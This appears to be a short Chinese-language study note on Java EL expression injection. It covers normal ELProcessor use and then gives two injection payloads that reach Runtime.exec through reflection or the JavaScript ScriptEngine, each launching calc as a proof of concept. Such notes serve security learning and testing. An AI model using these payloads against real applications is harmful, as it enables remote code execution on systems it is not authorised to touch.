---
title: EL表达式注入
draft: true
tags:
  - java
description: EL表达式注入
---
执行模板语法，类似模板注入

https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/

## 正常使用

jsp中使用的
```
hello, ${user.name}
```

能做一些简单的操作，数值相加，字符串拼接
```java
import javax.el.ELProcessor;  
  
public class EL {  
    public static void main(String[] args) {  
        ELProcessor processor = new ELProcessor();  
        processor.eval("1+1");
        processor.eval("'hello' += ' world'");
    }
}
```

如果定义了一些变量，后续即可直接使用。如果有敏感变量，比如session， config等，就可以进行操作。

```java
processor.defineBean("user", user);
processor.eval("user.name")
```

## 反射调用恶意方法

可以使用反射来获取到`Runtime`并执行`Runtime.getRuntime().exec`

```
"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe")
```

```java
"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','calc']).start()")
```
